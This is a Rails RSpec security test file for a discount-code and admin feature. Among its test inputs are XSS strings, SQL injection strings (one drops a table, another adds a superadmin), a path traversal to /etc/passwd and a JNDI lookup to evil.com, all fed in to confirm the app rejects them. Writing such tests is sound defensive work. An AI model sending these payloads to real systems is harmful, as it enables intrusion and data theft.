# frozen_string_literal: true

require 'rails_helper'

RSpec.describe 'Discount Code Security', type: :request do
  let(:superadmin) { create(:user, role: 'superadmin') }
  let(:admin) { create(:user, role: 'admin') }
  let(:regular_user) { create(:user, role: 'user') }
  let(:discount_code) { create(:discount_code, created_by: superadmin) }

  describe 'Authentication and Authorization' do
    describe 'Admin endpoints protection' do
      it 'requires authentication for all admin endpoints' do
        admin_endpoints = [
          { method: :get, path: '/admin/dashboard' },
          { method: :get, path: '/admin/discount_codes' },
          { method: :get, path: '/admin/discount_codes/new' },
          { method: :post, path: '/admin/discount_codes' },
          { method: :get, path: "/admin/discount_codes/#{discount_code.id}" },
          { method: :get, path: "/admin/discount_codes/#{discount_code.id}/edit" },
          { method: :patch, path: "/admin/discount_codes/#{discount_code.id}" },
          { method: :delete, path: "/admin/discount_codes/#{discount_code.id}" },
          { method: :get, path: '/admin/users' },
          { method: :post, path: '/admin/users' }
        ]

        admin_endpoints.each do |endpoint|
          send(endpoint[:method], endpoint[:path])
          
          expect(response).to have_http_status(:found)
          expect(response).to redirect_to(new_user_session_path)
        end
      end

      it 'requires superadmin role for write operations' do
        sign_in regular_user

        write_endpoints = [
          { method: :post, path: '/admin/discount_codes', params: { discount_code: { code: 'TEST' } } },
          { method: :patch, path: "/admin/discount_codes/#{discount_code.id}", params: { discount_code: { discount_percentage: 10 } } },
          { method: :delete, path: "/admin/discount_codes/#{discount_code.id}" },
          { method: :post, path: '/admin/users', params: { user: { email: 'test@example.com' } } }
        ]

        write_endpoints.each do |endpoint|
          send(endpoint[:method], endpoint[:path], params: endpoint[:params] || {})
          
          expect(response).to have_http_status(:found)
          expect(response).to redirect_to(root_path)
          expect(flash[:alert]).to include('Access denied')
        end
      end

      it 'allows admin read-only access but prevents write operations' do
        sign_in admin

        # Read operations should succeed
        get '/admin/dashboard'
        expect(response).to have_http_status(:success)

        get '/admin/discount_codes'
        expect(response).to have_http_status(:success)

        get "/admin/discount_codes/#{discount_code.id}"
        expect(response).to have_http_status(:success)

        # Write operations should be denied
        post '/admin/discount_codes', params: { discount_code: { code: 'TEST' } }
        expect(response).to have_http_status(:found)
        expect(response).to redirect_to(root_path)

        patch "/admin/discount_codes/#{discount_code.id}", params: { discount_code: { discount_percentage: 10 } }
        expect(response).to have_http_status(:found)
        expect(response).to redirect_to(root_path)
      end

      it 'prevents privilege escalation attempts' do
        sign_in admin

        # Try to create superadmin user
        post '/admin/users', params: {
          user: {
            email: 'evil@example.com',
            first_name: 'Evil',
            last_name: 'User',
            role: 'superadmin'
          }
        }

        expect(response).to have_http_status(:found)
        expect(response).to redirect_to(root_path)
        expect(flash[:alert]).to include('insufficient privileges')
      end
    end

    describe 'API endpoints protection' do
      it 'requires authentication for discount code validation' do
        post '/api/v1/discount_codes/validate', params: { code: 'TEST', billing_cycle: 'monthly' }
        
        expect(response).to have_http_status(:unauthorized)
        
        json_response = JSON.parse(response.body)
        expect(json_response['error']).to include('Authentication required')
      end

      it 'validates API tokens properly' do
        api_token = regular_user.api_tokens.create!(name: 'Test Token')

        # Valid token should work
        post '/api/v1/discount_codes/validate', 
             params: { code: discount_code.code, billing_cycle: 'monthly' },
             headers: { 'Authorization' => "Bearer #{api_token.token}" }
        
        expect(response).to have_http_status(:success)

        # Invalid token should fail
        post '/api/v1/discount_codes/validate', 
             params: { code: discount_code.code, billing_cycle: 'monthly' },
             headers: { 'Authorization' => 'Bearer invalid_token' }
        
        expect(response).to have_http_status(:unauthorized)

        # Expired token should fail
        api_token.update!(expires_at: 1.day.ago)
        
        post '/api/v1/discount_codes/validate', 
             params: { code: discount_code.code, billing_cycle: 'monthly' },
             headers: { 'Authorization' => "Bearer #{api_token.token}" }
        
        expect(response).to have_http_status(:unauthorized)
      end
    end
  end

  describe 'Input Validation and Sanitization' do
    before { sign_in superadmin }

    describe 'Discount code creation' do
      it 'prevents XSS attacks in discount code fields' do
        malicious_inputs = [
          '<script>alert("xss")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert(1)',
          '<svg onload="alert(1)">',
          '"><script>alert(1)</script>'
        ]

        malicious_inputs.each do |malicious_input|
          post '/admin/discount_codes', params: {
            discount_code: {
              code: malicious_input,
              discount_percentage: 20,
              max_usage_count: 100
            }
          }

          # Should either reject the input or sanitize it
          if response.status == 302 # Successful creation
            created_code = DiscountCode.last
            expect(created_code.code).not_to include('<script>')
            expect(created_code.code).not_to include('javascript:')
            expect(created_code.code).not_to include('onerror')
          else
            expect(response.body).not_to include(malicious_input)
          end
        end
      end

      it 'prevents SQL injection in discount code fields' do
        sql_injection_attempts = [
          "'; DROP TABLE discount_codes; --",
          "' UNION SELECT * FROM users --",
          "'; UPDATE users SET role='superadmin' WHERE id=1; --",
          "' OR '1'='1",
          "'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'superadmin'); --"
        ]

        sql_injection_attempts.each do |injection_attempt|
          post '/admin/discount_codes', params: {
            discount_code: {
              code: injection_attempt,
              discount_percentage: 20
            }
          }

          # Verify database integrity
          expect(DiscountCode.count).to be >= 1 # Original discount_code should still exist
          expect(User.where(email: 'hacker@evil.com')).to be_empty
          expect(User.where(role: 'superadmin').count).to eq(1) # Only original superadmin
        end
      end

      it 'validates numeric fields properly' do
        invalid_numeric_inputs = [
          { discount_percentage: 'abc' },
          { discount_percentage: '999999999999999999999' },
          { discount_percentage: '-50' },
          { discount_percentage: '0' },
          { discount_percentage: '100' },
          { max_usage_count: 'invalid' },
          { max_usage_count: '-1' },
          { max_usage_count: '999999999999999999999' }
        ]

        invalid_numeric_inputs.each do |invalid_input|
          post '/admin/discount_codes', params: {
            discount_code: {
              code: 'VALID_CODE',
              discount_percentage: 20,
              max_usage_count: 100
            }.merge(invalid_input)
          }

          expect(response).to have_http_status(:unprocessable_entity)
          expect(response.body).to include('error')
        end
      end
    end

    describe 'API input validation' do
      before { sign_in regular_user }

      it 'validates discount code format in API requests' do
        invalid_codes = [
          '<script>alert(1)</script>',
          '../../etc/passwd',
          'UNION SELECT * FROM users',
          '${jndi:ldap://evil.com/a}',
          'A' * 1000, # Extremely long input
          "\x00\x01\x02", # Binary data
          "NORMAL\nCODE\r\n" # Line breaks
        ]

        invalid_codes.each do |invalid_code|
          post '/api/v1/discount_codes/validate', params: {
            code: invalid_code,
            billing_cycle: 'monthly'
          }

          expect(response).to have_http_status(:unprocessable_entity)
          
          json_response = JSON.parse(response.body)
          expect(json_response['error']).to include('Invalid discount code')
          expect(response.body).not_to include(invalid_code) if invalid_code.include?('<')
        end
      end

      it 'validates billing cycle parameter' do
        invalid_cycles = [
          '<script>alert(1)</script>',
          'invalid_cycle',
          'UNION SELECT',
          '',
          nil,
          123,
          ['array'],
          { 'hash' => 'value' }
        ]

        invalid_cycles.each do |invalid_cycle|
          post '/api/v1/discount_codes/validate', params: {
            code: discount_code.code,
            billing_cycle: invalid_cycle
          }

          expect(response).to have_http_status(:unprocessable_entity)
          
          json_response = JSON.parse(response.body)
          expect(json_response['error']).to include('Invalid billing cycle')
        end
      end
    end
  end

  describe 'Rate Limiting and Abuse Prevention' do
    before { sign_in regular_user }

    it 'implements rate limiting for discount code validation' do
      # Make requests up to the limit
      15.times do
        post '/api/v1/discount_codes/validate', params: {
          code: 'INVALID_CODE',
          billing_cycle: 'monthly'
        }
      end

      # Next request should be rate limited
      post '/api/v1/discount_codes/validate', params: {
        code: discount_code.code,
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:too_many_requests)
      
      json_response = JSON.parse(response.body)
      expect(json_response['error']).to include('rate limit')
      expect(json_response['retry_after']).to be_present
    end

    it 'implements different rate limits for different endpoints' do
      # Admin endpoints should have different limits
      sign_in superadmin

      # Should allow more requests for admin operations
      20.times do
        get '/admin/discount_codes'
      end

      expect(response).to have_http_status(:success)

      # But still have some limit for protection
      50.times do
        get '/admin/discount_codes'
      end

      # Should eventually rate limit even admins
      expect(response).to have_http_status(:too_many_requests)
    end

    it 'tracks suspicious activity patterns' do
      # Simulate suspicious behavior: rapid invalid code attempts
      expect(Rails.logger).to receive(:warn).with(/Suspicious discount code activity/)

      10.times do
        post '/api/v1/discount_codes/validate', params: {
          code: 'INVALID_CODE',
          billing_cycle: 'monthly'
        }
      end
    end

    it 'prevents discount code enumeration attacks' do
      # Try to enumerate potential discount codes
      potential_codes = (1..20).map { |i| "DISCOUNT#{i}" }
      
      potential_codes.each do |code|
        post '/api/v1/discount_codes/validate', params: {
          code: code,
          billing_cycle: 'monthly'
        }

        # All invalid codes should return the same generic error
        if response.status == 422
          json_response = JSON.parse(response.body)
          expect(json_response['error']).to eq('Invalid discount code')
        end
      end

      # Should log enumeration attempt
      expect(Rails.logger).to have_received(:warn).with(/Potential discount code enumeration/)
    end
  end

  describe 'Session and CSRF Protection' do
    it 'requires valid CSRF tokens for state-changing operations' do
      sign_in superadmin

      # Disable CSRF protection temporarily to test
      allow_any_instance_of(ActionController::Base).to receive(:protect_against_forgery?).and_return(true)

      # POST without CSRF token should fail
      post '/admin/discount_codes', params: {
        discount_code: { code: 'TEST', discount_percentage: 20 }
      }, headers: { 'X-CSRF-Token' => 'invalid_token' }

      expect(response).to have_http_status(:unprocessable_entity)
    end

    it 'invalidates sessions after suspicious activity' do
      sign_in regular_user

      # Simulate suspicious activity
      20.times do
        post '/api/v1/discount_codes/validate', params: {
          code: 'INVALID',
          billing_cycle: 'monthly'
        }
      end

      # Session should be invalidated
      get '/profile'
      expect(response).to redirect_to(new_user_session_path)
    end

    it 'implements secure session management' do
      sign_in superadmin

      # Session should have secure attributes
      expect(session[:user_id]).to be_present
      expect(cookies['_session_id']).to be_present

      # Session should expire after inactivity
      travel 25.hours do
        get '/admin/dashboard'
        expect(response).to redirect_to(new_user_session_path)
      end
    end
  end

  describe 'Data Protection and Privacy' do
    before { sign_in superadmin }

    it 'protects sensitive user data in admin interfaces' do
      user_with_sensitive_data = create(:user, 
        email: 'sensitive@example.com',
        encrypted_password: 'encrypted_password_hash'
      )

      get "/admin/users/#{user_with_sensitive_data.id}"

      # Should not expose sensitive data
      expect(response.body).not_to include('encrypted_password_hash')
      expect(response.body).not_to include(user_with_sensitive_data.encrypted_password)
      
      # Should show email but not password
      expect(response.body).to include('sensitive@example.com')
    end

    it 'logs access to sensitive operations' do
      expect(Rails.logger).to receive(:info).with(/Admin accessed user management/)

      get '/admin/users'
    end

    it 'implements audit logging for all admin operations' do
      expect {
        post '/admin/discount_codes', params: {
          discount_code: {
            code: 'AUDIT_TEST',
            discount_percentage: 20
          }
        }
      }.to change(AuditLog, :count).by(1)

      audit_log = AuditLog.last
      expect(audit_log.action).to eq('discount_code_created')
      expect(audit_log.user_id).to eq(superadmin.id)
      expect(audit_log.details['code']).to eq('AUDIT_TEST')
    end

    it 'redacts sensitive information in logs' do
      # Mock logger to capture log messages
      log_messages = []
      allow(Rails.logger).to receive(:info) { |message| log_messages << message }

      post '/api/v1/discount_codes/validate', params: {
        code: discount_code.code,
        billing_cycle: 'monthly'
      }

      # Logs should not contain sensitive user information
      log_messages.each do |message|
        expect(message).not_to include(regular_user.encrypted_password)
        expect(message).not_to include('password')
      end
    end
  end

  describe 'Infrastructure Security' do
    it 'implements proper HTTP security headers' do
      sign_in superadmin
      get '/admin/dashboard'

      # Check for security headers
      expect(response.headers['X-Frame-Options']).to eq('DENY')
      expect(response.headers['X-Content-Type-Options']).to eq('nosniff')
      expect(response.headers['X-XSS-Protection']).to eq('1; mode=block')
      expect(response.headers['Strict-Transport-Security']).to be_present
      expect(response.headers['Content-Security-Policy']).to be_present
    end

    it 'prevents information disclosure in error messages' do
      # Try to access non-existent discount code
      sign_in superadmin
      
      get '/admin/discount_codes/00000000-0000-0000-0000-000000000000'

      # Should not reveal internal system information
      expect(response.body).not_to include('ActiveRecord')
      expect(response.body).not_to include('database')
      expect(response.body).not_to include('SQL')
      expect(response.body).not_to include('backtrace')
    end

    it 'implements secure file upload handling' do
      # Test CSV export functionality
      sign_in superadmin
      
      get '/admin/discount_codes/export.csv'

      # Should have proper content type and headers
      expect(response.content_type).to include('text/csv')
      expect(response.headers['Content-Disposition']).to include('attachment')
      
      # Should not allow arbitrary file access
      get '/admin/discount_codes/export', params: { file: '../../etc/passwd' }
      expect(response).not_to have_http_status(:success)
    end
  end

  describe 'Business Logic Security' do
    before { sign_in regular_user }

    it 'prevents discount code abuse through timing attacks' do
      # All validation requests should take similar time regardless of code validity
      start_time = Time.current
      
      post '/api/v1/discount_codes/validate', params: {
        code: discount_code.code,
        billing_cycle: 'monthly'
      }
      
      valid_code_time = Time.current - start_time

      start_time = Time.current
      
      post '/api/v1/discount_codes/validate', params: {
        code: 'INVALID_CODE_THAT_DOES_NOT_EXIST',
        billing_cycle: 'monthly'
      }
      
      invalid_code_time = Time.current - start_time

      # Time difference should be minimal to prevent timing attacks
      time_difference = (valid_code_time - invalid_code_time).abs
      expect(time_difference).to be < 0.1 # Less than 100ms difference
    end

    it 'prevents concurrent usage exploitation' do
      # Create a discount with limited usage
      limited_code = create(:discount_code, max_usage_count: 1, current_usage_count: 0)
      
      # Simulate concurrent requests
      threads = []
      results = []

      5.times do
        threads << Thread.new do
          # Each thread tries to use the discount
          service = DiscountCodeService.new(user: create(:user, discount_code_used: false))
          result = service.record_usage(limited_code, {
            subscription_id: 'sub_test',
            original_amount: 1000,
            discount_amount: 200,
            final_amount: 800
          })
          results << result.success?
        end
      end

      threads.each(&:join)

      # Only one should succeed
      successful_count = results.count(true)
      expect(successful_count).to eq(1)

      # Code should be properly deactivated
      limited_code.reload
      expect(limited_code.active?).to be false
    end

    it 'validates business rules consistently' do
      # User already used a discount
      user_with_discount = create(:user, discount_code_used: true)
      
      # Should be rejected at validation level
      post '/api/v1/discount_codes/validate', 
           params: { code: discount_code.code, billing_cycle: 'monthly' },
           headers: { 'Authorization' => "Bearer #{user_with_discount.api_tokens.create!.token}" }

      expect(response).to have_http_status(:unprocessable_entity)

      # Should also be rejected at service level
      service = DiscountCodeService.new(user: user_with_discount)
      result = service.validate_code(discount_code.code)
      expect(result.success?).to be false

      # Should be rejected at model level
      expect(user_with_discount.eligible_for_discount?).to be false
    end
  end

  describe 'Compliance and Regulatory' do
    it 'implements data retention policies' do
      # Create old audit logs
      old_audit_log = create(:audit_log, created_at: 2.years.ago)
      recent_audit_log = create(:audit_log, created_at: 1.day.ago)

      # Simulate data retention cleanup
      AuditLog.where('created_at < ?', 1.year.ago).destroy_all

      # Old logs should be removed, recent ones retained
      expect(AuditLog.exists?(old_audit_log.id)).to be false
      expect(AuditLog.exists?(recent_audit_log.id)).to be true
    end

    it 'provides data export capabilities for compliance' do
      sign_in superadmin

      # Should be able to export user data
      get "/admin/users/#{regular_user.id}/export"
      
      expect(response).to have_http_status(:success)
      expect(response.content_type).to include('application/json')
      
      user_data = JSON.parse(response.body)
      expect(user_data['email']).to eq(regular_user.email)
      expect(user_data['discount_usage_history']).to be_present
    end

    it 'implements right to be forgotten' do
      sign_in superadmin

      # User requests data deletion
      delete "/admin/users/#{regular_user.id}", params: { 
        gdpr_deletion: true,
        confirmation: 'DELETE' 
      }

      expect(response).to have_http_status(:success)

      # User data should be anonymized, not just deleted
      deleted_user = User.find_by(id: regular_user.id)
      expect(deleted_user).to be_nil

      # Related records should be anonymized
      audit_logs = AuditLog.where(user_id: regular_user.id)
      audit_logs.each do |log|
        expect(log.details['user_email']).to eq('[DELETED]')
      end
    end
  end
end